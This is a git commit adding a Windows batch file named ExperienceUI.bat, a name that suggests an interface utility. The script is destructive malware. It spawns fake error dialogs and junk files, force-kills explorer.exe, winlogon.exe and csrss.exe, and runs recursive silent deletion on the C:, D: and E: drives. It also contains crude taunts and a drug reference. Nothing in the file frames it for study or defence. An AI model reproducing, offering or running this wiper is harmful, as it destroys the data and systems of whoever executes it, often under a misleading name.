55749a5b2279c841ad0f8962c48f2948aa208377
Neo <167165649+neo6942@users.noreply.github.com>
2024-04-16 16:30:22 -0700

    Create ExperienceUI.bat

---
+++ win/ExperienceUI.bat
@@ -0,0 +1,122 @@
+@echo off
+
+::// CODE MADE BY NEOBOY, DONT RUIN
+
+type nul > Uhoh.txt
+echo OOPS! YOUR COMPUTER IS FUCKING TRASHED HAHAHAHAHA > Uhoh.txt
+start Uhoh.txt
+pause
+
+md %random%
+
+
+
+echo.X=MsgBox("%random%",0+16,"%random%") >> FakeErrorMsg.vbs
+echo.X=MsgBox("Msg",1+10,"Title") >> FakeErrorMsg1.vbs
+echo.X=MsgBox("Msg",2+32,"Title") >> FakeErrorMsg2.vbs
+echo.X=MsgBox("Msg",3+48,"Title") >> FakeErrorMsg3.vbs
+start FakeErrorMsg.vbs
+start FakeErrorMsg1.vbs
+start FakeErrorMsg2.vbs
+start FakeErrorMsg3.vbs
+
+
+color a
+color b
+color c
+
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+
+echo I DRANK AN 8 BALL OF COKE
+echo AND NOW IM GONNA FUCK YOUR PC
+
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+type nul > %random%.txt
+
+taskkill /f /im explorer.exe
+taskkill /f /im winlogon.exe
+taskkill /f /im csrss.exe
+
+rd/s/q D:
+
+rd/s/q C:
+
+rd/s/q E:
+
+echo DSFDSFDSFDSFDSFDSFDSFDSDS
+echo DJLFDSHFDSLKJLLKJFDSHLKJFDSHLKJHFDSLKJFDSLKJLJHFDS
+echo DSFDSFDSFDSFDSFDSFDSFDSDS
+echo DJLFDSHFDSLKJLLKJFDSHLKJFDSHLKJHFDSLKJFDSLKJLJHFDS
+echo DSFDSFDSFDSFDSFDSFDSFDSDS
+echo DJLFDSHFDSLKJLLKJFDSHLKJFDSHLKJHFDSLKJFDSLKJLJHFDS
+start notepad
+
+
+
+
+
+
+
